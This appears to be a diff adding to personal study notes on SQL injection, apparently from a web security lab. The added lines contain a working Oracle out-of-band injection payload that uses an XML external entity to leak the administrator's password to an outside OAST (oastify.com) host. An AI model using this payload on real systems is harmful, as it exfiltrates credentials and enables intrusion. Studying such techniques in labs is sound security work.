@@ -30,3 +30,8 @@ tags:
 - Checks password length
 - Sends z.domain if success
 - Sends nothing if failed
+
+```
+'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT password FROM users WHERE username='administrator')||'.tyvbcozlhbbrxd2nvtve3nma319sxkl9.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)||'
+```
+- Extracts password and sends to OAST server
